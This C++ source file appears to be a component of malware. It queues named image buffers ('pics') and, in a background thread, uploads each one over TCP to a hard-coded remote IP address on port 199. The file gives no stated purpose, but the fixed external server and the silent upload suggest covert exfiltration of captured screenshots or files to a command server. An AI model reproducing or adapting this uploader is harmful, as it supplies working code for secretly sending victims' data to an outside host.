#include "stdafx.h"
#include "../common/ws2help.h"
#include "../common/crypt.h"
#include "../common/keyfile.h"
#include "../common/lock.h"


//===============================================
//

class CPicBuffer
{
protected:

	wstring m_Name;
	vector<BYTE> m_Data;

	CPicBuffer(){}
	~CPicBuffer(){}

protected:

	static CLock m_PickLock;
	static vector<CPicBuffer*> m_PicQueue;

public:

	static void Add( LPCWSTR pName, BYTE *pData, DWORD dwSize )
	{
		m_PickLock.Lock();
		m_PicQueue.push_back(new CPicBuffer());
		m_PicQueue.back()->Init( pName, pData, dwSize );
		m_PickLock.Unlock();
	}

	static void Poll( SOCKET s )
	{
		m_PickLock.Lock();

		vector<CPicBuffer*>::iterator I = m_PicQueue.begin();
		for( ; I != m_PicQueue.end(); I++ )
		{
			if( (*I)->Send(s) )
			{
				delete (*I);
				m_PicQueue.erase( I );
				break;
			}
		}

		m_PickLock.Unlock();
	}

protected:

	void Init( LPCWSTR pName, BYTE *pData, DWORD dwSize )
	{
		m_Name = pName;
		m_Data.insert( m_Data.end(), pData, pData + dwSize );
	}

	bool Send( SOCKET s )
	{
		vector<BYTE> buffer;

		DWORD dwSize = 4 + 2 * (m_Name.length() + 1) + m_Data.size();
		buffer.insert( buffer.end(), (BYTE*)&dwSize, ((BYTE*)&dwSize)+4 );
		buffer.insert( buffer.end(), (BYTE*)(m_Name.c_str()), (BYTE*)(m_Name.c_str() + m_Name.length() + 1) );
		buffer.insert( buffer.end(), m_Data.begin(), m_Data.end() );

		BYTE *p = buffer.get_allocator().address(buffer.front());
		return (send( s, (char*)p, buffer.size(), 0 ) == buffer.size() );
	}
};


CLock CPicBuffer::m_PickLock;
vector<CPicBuffer*> CPicBuffer::m_PicQueue;

//===============================================
// params

//string g_ParamPicServer = "127.0.0.1";
string g_ParamPicServer = "188.72.213.145";
int g_ParamPicPort = 199;

//===============================================
// client

DWORD WINAPI PicClientThread( LPVOID )
{
	WS_Start();
	SOCKET s = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if( s != INVALID_SOCKET )
	{
		sockaddr_in rmt;
		ZeroMemory( &rmt, sizeof(rmt) );

		sockaddr_in loc;
		ZeroMemory( &loc, sizeof(loc) );
		if( WS_ResolveName( &loc, 0, "" ) &&
			WS_ResolveName( &rmt, 0, g_ParamPicServer.c_str() ) )
		{
			loc.sin_family = AF_INET;
			rmt.sin_family = AF_INET;
			rmt.sin_port = htons(g_ParamPicPort);

			if( bind( s, (sockaddr*)&loc, sizeof(loc) ) == 0 )
			{
				if( connect( s, (sockaddr*)&rmt, sizeof(rmt) ) == 0 )
				{
					CPicBuffer::Poll( s );
					Sleep( 50 );
				}
			}
		}

		shutdown( s, SD_BOTH );
		closesocket( s );
	}
	return 0;
}


void SendPic( LPCWSTR pName, BYTE *pData, DWORD dwSize )
{
	CPicBuffer::Add( pName, pData, dwSize );

	DWORD dwClient = 0;
	HANDLE hClient = CreateThread(0,0,PicClientThread,0,0,&dwClient);
	WaitForSingleObject( hClient, 30000 );
	CloseHandle( hClient );
}
